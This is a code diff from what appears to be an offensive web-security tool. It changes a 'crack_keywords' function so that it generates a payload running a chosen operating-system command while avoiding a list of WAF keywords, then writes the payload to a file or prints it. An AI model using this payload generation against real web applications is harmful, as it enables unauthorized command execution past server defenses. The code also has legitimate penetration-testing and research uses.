@@ -1043,7 +1043,6 @@ def crack_keywords(
         rich_escape(repr(waf_keywords)),
         extra={"markup": True, "highlighter": None},
     )
-    time.sleep(1)
     options = Options(
         detect_mode=detect_mode,
         environment=environment,
@@ -1052,14 +1051,33 @@ def crack_keywords(
         python_subversion=python_subversion,
         waf_keywords=waf_keywords,
     )
-    submitter = IOSubmitter(output_path)
-    with submitter.stop_saving():
-        cracker = Cracker(submitter, callback=None, options=options)
-        full_payload_gen = cracker.crack()
-    if not full_payload_gen:
-        logger.error("Crack failed...")
+    full_payload_gen = FullPayloadGen(
+        waf_func=lambda x: all(keyword not in x for keyword in waf_keywords),
+        callback=None,
+        options=options,
+    )
+    payload, will_print = full_payload_gen.generate("os_popen_read", command)
+    if payload is None or will_print is None:
+        logger.error(
+            "Generate [yellow]%s[/] failed...",
+            rich_escape(command),
+            extra={"markup": True, "highlighter": None},
+        )
         raise RunFailed()
-    do_crack(full_payload_gen, submitter, command)
+    if not will_print:
+        logger.warning(
+            "This payload has [red]No Output[/]! We won't see anything!",
+            extra={"markup": True, "highlighter": None},
+        )
+    if output_path:
+        output_path.write_text(payload)
+        logger.info(
+            "[cyan bold]Done![/] Payload is written into [blue]%s[/]",
+            rich_escape(output_path.as_posix()),
+            extra={"markup": True, "highlighter": None},
+        )
+    else:
+        print(payload)
 
 
 @main.command()
